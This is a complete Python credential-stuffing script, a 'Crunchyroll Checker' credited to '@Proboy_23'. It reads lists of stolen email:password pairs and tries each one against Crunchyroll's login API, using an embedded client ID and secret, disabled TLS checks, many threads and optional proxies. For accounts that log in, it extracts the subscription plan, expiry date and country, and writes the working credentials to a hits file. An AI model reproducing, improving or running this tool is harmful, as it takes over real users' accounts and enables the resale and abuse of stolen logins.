import os
import sys
import re
import json
import time
import uuid
import urllib.request
import urllib.parse
import urllib.error
import http.cookiejar
import ssl
import gzip
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone

# ================= COLORS =================
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

# ================= CONFIG =================
PASSWORD = "@Proboy_23"
CLIENT_ID = "ajotlh6seq0r6lnvhahz"
CLIENT_SECRET = "pL0okM9i_JN8uhB7ygV6tcF5rdE4esW3"
BASIC_AUTH = "Basic YWJvdGxoMXdlcTByNGxudm5haHo6dWlLSjJqUXRVX0FQYzdZa0hqSWlDTFoyMjhnbGxOY2o="
API_BASE = "https://rise-api.crunchyroll.com"

# Fixed Device Info (No Random)
DEVICE_ID = "3M8V1P6Q4R9W2Z7Y5K3L8N4J9X"
DEVICE_NAME = "My Device"
DEVICE_TYPE = "ANDROIDTV"
USER_AGENT = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

stats = {"HIT": 0, "FREE": 0, "BAD": 0, "RATE": 0, "ERROR": 0, "CHECKED": 0, "TOTAL": 0}
lock = threading.Lock()

COUNTRY_MAP = {"US": "United States", "GB": "United Kingdom", "IN": "India", "DE": "Germany", "FR": "France", "CA": "Canada", "AU": "Australia", "JP": "Japan", "BR": "Brazil", "BD": "Bangladesh", "PK": "Pakistan", "PH": "Philippines", "ID": "Indonesia", "MY": "Malaysia", "SG": "Singapore"}

def format_country(code):
    return COUNTRY_MAP.get(code.upper(), code) if code else "Unknown"

def get_days_left(expiry_date):
    try:
        if not expiry_date or expiry_date == "N/A": return "N/A"
        d = datetime.strptime(expiry_date.split("T")[0], "%Y-%m-%d").date()
        return max(0, (d - datetime.now(timezone.utc).date()).days)
    except: return "N/A"

# ================= NETWORK =================
def make_request(url, data=None, headers=None, method='GET', proxy_url=None):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
    
    if proxy_url:
        proxy_handler = urllib.request.ProxyHandler({'http': proxy_url, 'https': proxy_url})
        opener.add_handler(proxy_handler)
        
    if headers is None: headers = {}
    
    if data:
        if isinstance(data, dict): data = urllib.parse.urlencode(data).encode('utf-8')
        elif isinstance(data, str): data = data.encode('utf-8')
        
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    
    try:
        with opener.open(req, timeout=25) as response:
            content = response.read()
            if response.headers.get('Content-Encoding') == 'gzip':
                content = gzip.decompress(content)
            return response.status, content.decode('utf-8', errors='ignore')
    except urllib.error.HTTPError as e:
        content = e.read()
        if e.headers.get('Content-Encoding') == 'gzip':
            content = gzip.decompress(content)
        return e.code, content.decode('utf-8', errors='ignore')
    except Exception as e:
        return 0, str(e)

# ================= MAIN CHECKER =================
def check_crunchyroll(email, password, proxy_url=None):
    try:
        # 1. LOGIN
        login_url = f"{API_BASE}/auth/v1/token"
        login_data = {
            "grant_type": "password",
            "username": email, "password": password,
            "scope": "offline_access",
            "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
            "device_type": DEVICE_TYPE,
            "device_id": DEVICE_ID,
            "device_name": DEVICE_NAME,
        }
        headers = {
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip",
            "User-Agent": USER_AGENT,
            "X-Crunchyroll-Device-Id": DEVICE_ID,
            "ETP-Anonymous-ID": DEVICE_ID,
            "Authorization": BASIC_AUTH,
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        }
        
        status, res_text = make_request(login_url, data=login_data, headers=headers, method='POST', proxy_url=proxy_url)
        
        if status == 429 or "too_many_requests" in res_text:
            return "RATE", {}
        if status in (400, 401):
            return "BAD", {}
        if status != 200:
            return "ERROR", {"reason": f"HTTP {status}"}
        
        try: login_json = json.loads(res_text)
        except: return "ERROR", {"reason": "Login JSON Error"}
        
        token = login_json.get("access_token")
        if not token: return "ERROR", {"reason": "No Access Token"}
        
        auth_headers = {
            "Authorization": f"Bearer {token}",
            "User-Agent": USER_AGENT,
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip",
        }
        
        # 2. ACCOUNT INFO
        status, me_text = make_request(f"{API_BASE}/accounts/v1/me", headers=auth_headers, proxy_url=proxy_url)
        if status != 200: return "ERROR", {"reason": "Account API Error"}
        
        try: me_json = json.loads(me_text)
        except: return "ERROR", {"reason": "Account JSON Error"}
        
        ext_id = me_json.get("external_id")
        username = me_json.get("username", email.split("@")[0])
        verified = "Yes" if me_json.get("email_verified") else "No"
        
        if not ext_id: return "ERROR", {"reason": "No External ID"}
        
        # 3. BENEFITS CHECK (Strict)
        status, ben_text = make_request(f"{API_BASE}/subs/v1/subscriptions/{ext_id}/benefits", headers=auth_headers, proxy_url=proxy_url)
        
        if "subscription.not_found" in ben_text or '"total":0' in ben_text or "concurrent_streams" not in ben_text:
            return "FREE", {"user": username, "verified": verified}
        
        # 4. PLAN DETAILS
        plan_sku = "Unknown"
        currency = "N/A"
        status, prod_text = make_request(f"{API_BASE}/subs/v1/subscriptions/{ext_id}/products", headers=auth_headers, proxy_url=proxy_url)
        if status == 200:
            try:
                prod_json = json.loads(prod_text)
                items = prod_json.get("items", [])
                if items:
                    plan_sku = items[0].get("product", {}).get("sku", "Unknown")
                    currency = items[0].get("currency_code", "N/A")
            except: pass
        
        # 5. EXPIRY & STATUS
        expiry = "N/A"
        auto_renew = "N/A"
        is_active = False
        country = "Unknown"
        
        status, sub_text = make_request(f"{API_BASE}/subs/v1/subscriptions/{ext_id}", headers=auth_headers, proxy_url=proxy_url)
        if status == 200:
            try:
                sub_json = json.loads(sub_text)
                is_active = sub_json.get("is_active", False)
                expiry = sub_json.get("next_renewal_date", "N/A")
                if expiry and expiry != "N/A": expiry = expiry.split("T")[0]
                auto_renew = "Yes" if sub_json.get("auto_renew", False) else "No"
                country = sub_json.get("country_code", "Unknown")
            except: pass
        
        days_left = get_days_left(expiry)
        
        # 6. FORMAT PLAN
        sku_lower = plan_sku.lower() if plan_sku else ""
        if "ultimate" in sku_lower: plan_name = "ULTIMATE FAN"
        elif "mega" in sku_lower or "fanpack" in sku_lower: plan_name = "MEGA FAN"
        elif "fan" in sku_lower or "premium" in sku_lower: plan_name = "FAN"
        elif plan_sku != "Unknown" and plan_sku != "N/A": plan_name = plan_sku
        else:
            streams_match = re.search(r'"concurrent_streams\.(\d+)"', ben_text)
            streams = streams_match.group(1) if streams_match else "0"
            plan_name = {"1": "FAN", "4": "MEGA FAN", "6": "ULTIMATE FAN"}.get(streams, "Unknown")
        
        if plan_name == "Unknown":
            return "ERROR", {"reason": "Unknown Plan"}
        
        # STRICT CHECK: Must have is_active and valid plan
        if is_active and plan_name != "Unknown":
            return "HIT", {
                "user": username, "plan": plan_name, "currency": currency,
                "country": format_country(country), "country_code": country,
                "expiry": expiry, "days": days_left, "renew": auto_renew,
                "verified": verified, "sku": plan_sku
            }
        
        return "ERROR", {"reason": "Missing final data"}
        
    except Exception as e:
        return "ERROR", {"reason": str(e)[:60]}

# ================= PROCESS =================
def process_account(combo, proxy_url):
    if ":" not in combo: return
    email, password = combo.split(":", 1)
    email, password = email.strip(), password.strip()
    
    status, data = check_crunchyroll(email, password, proxy_url)
    
    with lock:
        stats["CHECKED"] += 1
        if status in stats: stats[status] += 1
        
        if status == "HIT":
            print(f"\n{GREEN}{BOLD}╔════════════════════════════════════════════╗")
            print("║            🟢 CRUNCHYROLL HIT              ║")
            print("╚════════════════════════════════════════════╝" + RESET)
            print(f"{WHITE}📧 Combo  : {email}:{password}{RESET}")
            print(f"{YELLOW}👤 User   : {data.get('user', 'N/A')}{RESET}")
            print(f"{GREEN}📦 Plan   : {data.get('plan', 'N/A')}{RESET}")
            print(f"{CYAN}🌍 Country: {data.get('country', 'N/A')}{RESET}")
            print(f"{WHITE}📅 Expiry : {data.get('expiry', 'N/A')}{RESET}")
            print(f"{WHITE}⏳ Days   : {data.get('days', 'N/A')}{RESET}")
            print(f"{WHITE}🔄 Renew  : {data.get('renew', 'N/A')}{RESET}")
            print(f"{MAGENTA}🔥 Checker: @Proboy_23{RESET}")
            print(f"{CYAN}──────────────────────────────────────────────{RESET}")
            with open("CR_Hits.txt", "a", encoding="utf-8") as f:
                f.write(f"{email}:{password} | Plan: {data.get('plan')} | Expiry: {data.get('expiry')} | Days: {data.get('days')} | Country: {data.get('country')} | By @Proboy_23\n")
        elif status == "FREE":
            print(f"{YELLOW}🟡 FREE | {email}:{password}{RESET}")
            with open("CR_Free.txt", "a", encoding="utf-8") as f:
                f.write(f"{email}:{password} | FREE | By @Proboy_23\n")
        elif status == "BAD":
            print(f"{RED}❌ BAD | {email}:{password}{RESET}")
        elif status == "RATE":
            print(f"{YELLOW}⚠️ RATE LIMIT | {email}:{password}{RESET}")
        else:
            print(f"{MAGENTA}🔧 ERROR | {email}:{password} | {data.get('reason', 'Unknown')}{RESET}")

# ================= MENU =================
def show_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{CYAN}{BOLD}==================================================")
    print("        🍥 CRUNCHYROLL CHECKER 🍥")
    print(f"                Owner: @Proboy_23")
    print(f"=================================================={RESET}\n")
    print(f"{WHITE}[1]{RESET} Start Checking")
    print(f"{WHITE}[2]{RESET} Exit")
    print()

def run_checker():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{CYAN}{BOLD}==================================================")
    print("        🍥 CRUNCHYROLL CHECKER 🍥")
    print(f"                Owner: @Proboy_23")
    print(f"=================================================={RESET}\n")

    print(f"{WHITE}[?] Enter Combo File Path OR Paste Combos below:{RESET}")
    print(f"{YELLOW}    (If pasting, press ENTER twice to start){RESET}")
    
    combos = []
    try: first_input = input().strip()
    except: first_input = ""
    
    if first_input and os.path.isfile(first_input.strip('"').strip("'")):
        with open(first_input.strip('"').strip("'"), "r", encoding="utf-8", errors="ignore") as f:
            combos = [line.strip() for line in f if ":" in line]
        print(f"\n{GREEN}[+] {len(combos)} Combos Loaded from file.{RESET}")
    else:
        if first_input and ":" in first_input: combos.append(first_input)
        empty_count = 0
        while True:
            try:
                line = input()
                if not line.strip():
                    empty_count += 1
                    if empty_count >= 2: break
                    continue
                empty_count = 0
                if ":" in line: combos.append(line.strip())
            except EOFError: break
        print(f"\n{GREEN}[+] {len(combos)} Combos Loaded.{RESET}")

    if not combos:
        print(f"{RED}[!] No valid combos found.{RESET}")
        input("Press ENTER to return...")
        return

    try:
        proxy_in = input(f"\n{WHITE}[?] Enter Proxy (ip:port) [Press Enter for Proxyless]: {RESET}").strip()
    except: proxy_in = ""
    
    proxy_url = None
    if proxy_in:
        if proxy_in.startswith(("http://", "https://")): proxy_url = proxy_in
        elif proxy_in.count(':') == 3:
            parts = proxy_in.split(':')
            proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else: proxy_url = f"http://{proxy_in}"
        print(f"{GREEN}[+] Proxy Loaded: {proxy_url}{RESET}")
    else:
        print(f"{YELLOW}[!] Running Proxyless Mode.{RESET}")

    try:
        threads_input = input(f"{WHITE}[?] Threads (Recommended 10): {RESET}").strip()
        threads = int(threads_input) if threads_input.isdigit() else 10
    except: threads = 10
        
    stats["TOTAL"] = len(combos)
    print(f"\n{CYAN}🚀 Starting Check with {threads} threads... Please wait.{RESET}\n")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(process_account, c, proxy_url) for c in combos]
        for fut in as_completed(futures):
            try: fut.result()
            except: pass

    print(f"\n\n{CYAN}{BOLD}==================================================")
    print(f"✅ CHECK COMPLETE")
    print(f"{CYAN}=================================================={RESET}")
    print(f"{GREEN}💎 Hits: {stats['HIT']}{RESET}")
    print(f"{YELLOW}🟡 Free: {stats['FREE']}{RESET}")
    print(f"{RED}❌ Bad: {stats['BAD']}{RESET}")
    print(f"{MAGENTA}🔧 Errors: {stats['ERROR']}{RESET}")
    print(f"{CYAN}=================================================={RESET}")
    print(f"{MAGENTA}🔥 Checker by : @Proboy_23{RESET}")
    print(f"{CYAN}=================================================={RESET}")
    
    input("\nPress ENTER to return to menu...")

# ================= MAIN =================
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{CYAN}{BOLD}==================================================")
    print("        🍥 CRUNCHYROLL CHECKER 🍥")
    print(f"                Owner: @Proboy_23")
    print(f"=================================================={RESET}\n")
    
    password = input(f"{WHITE}[?] Enter Password: {RESET}").strip()
    
    if password != PASSWORD:
        print(f"{RED}❌ Invalid Password!{RESET}")
        sys.exit(1)
    
    print(f"{GREEN}✅ Access Granted!{RESET}")
    time.sleep(1)
    
    while True:
        show_menu()
        choice = input(f"{WHITE}[?] Select Option: {RESET}").strip()
        
        if choice == "1":
            run_checker()
        elif choice == "2":
            print(f"{GREEN}✅ Goodbye!{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}❌ Invalid Option!{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()
